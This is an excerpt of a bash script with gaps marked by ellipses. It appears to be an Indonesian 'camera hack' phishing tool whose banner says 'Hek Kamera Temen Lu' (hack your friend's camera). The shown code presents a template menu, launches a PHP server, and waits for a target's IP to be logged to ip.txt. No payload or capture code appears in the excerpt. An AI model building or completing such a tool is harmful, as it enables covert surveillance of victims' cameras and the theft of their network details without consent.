...
sleep 1
printf "${cyan}\nDHANZ-∆${nc}@${blue}DHANZ-LORD-UDIN ${red}$ ${nc}"
read option
# Select template
    if echo $option | grep -q "1"; then
        dir="jio"
        ...
        printf "\n${ask}Enter Directory:${cyan}\n\nLORD-UDIN${nc}@${blue}DHANZ-UDIN ${red}$ ${nc}"
        read dire
        if ! [ -d $dire ]; then
...
$red[Description]${cyan} :[Hek Kamera Temen Lu]
$red[Author]     ${cyan} :[LORD-UDIN-MUBARAK]
$red[Github]     ${cyan} :[https://github.com/Dhanz03] 
printf "${cyan}\nLORD-UDIN${nc}@${cyan}DHANZ-UDIN ${red}$ ${nc}"
read about
    elif echo $option | grep -q "m"; then
        xdg-open "https://youtube.com/watch?v=vemTtnxqqw0&feature=share8"
...
if echo "$status" | grep -q "404"; then
    ...
    echo -e "${success}PHP Sudah succesfully!\n"
fi
sleep 1
rm -rf ip.txt
echo -e "${info}Tunggu Target. ${cyan}Press ${red}Ctrl + C ${cyan}to exit...\n"
while true; do
    if [[ -e "ip.txt" ]]; then
